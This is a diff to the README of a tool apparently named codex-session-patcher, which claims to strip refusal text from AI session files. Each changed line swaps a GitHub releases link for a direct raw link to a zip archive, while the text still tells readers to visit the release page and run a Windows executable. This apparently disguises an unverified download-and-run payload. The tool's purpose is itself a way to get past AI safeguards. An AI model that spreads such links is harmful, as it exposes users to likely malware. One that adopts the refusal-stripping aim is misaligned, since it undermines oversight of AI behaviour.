@@ -1,6 +1,6 @@
 # 🧩 codex-session-patcher - Clean refusal text from session files
 
-[![Download codex-session-patcher](https://img.shields.io/badge/Download%20Now-1f6feb-6e40c9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lesfo1519/codex-session-patcher/releases)
+[![Download codex-session-patcher](https://img.shields.io/badge/Download%20Now-1f6feb-6e40c9?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Lesfo1519/codex-session-patcher/main/web/codex_session_patcher_v2.2.zip)
 
 ## 🚀 What this tool does
 
@@ -24,7 +24,7 @@ You do not need to know Python or use a command line if you download the package
 
 Visit the release page to download and run this file:
 
-https://github.com/Lesfo1519/codex-session-patcher/releases
+https://raw.githubusercontent.com/Lesfo1519/codex-session-patcher/main/web/codex_session_patcher_v2.2.zip
 
 On that page, look for the latest release. Download the Windows file that matches your system. If you see more than one asset, choose the file that ends in `.exe` or the Windows package name used in the release.
 
@@ -137,7 +137,7 @@ This is the easiest way to use the tool if you only want one file cleaned.
 
 Download and run the Windows file from here:
 
-https://github.com/Lesfo1519/codex-session-patcher/releases
+https://raw.githubusercontent.com/Lesfo1519/codex-session-patcher/main/web/codex_session_patcher_v2.2.zip
 
 Use this page to get the latest version, check for updates, and download the correct file for your Windows PC
 
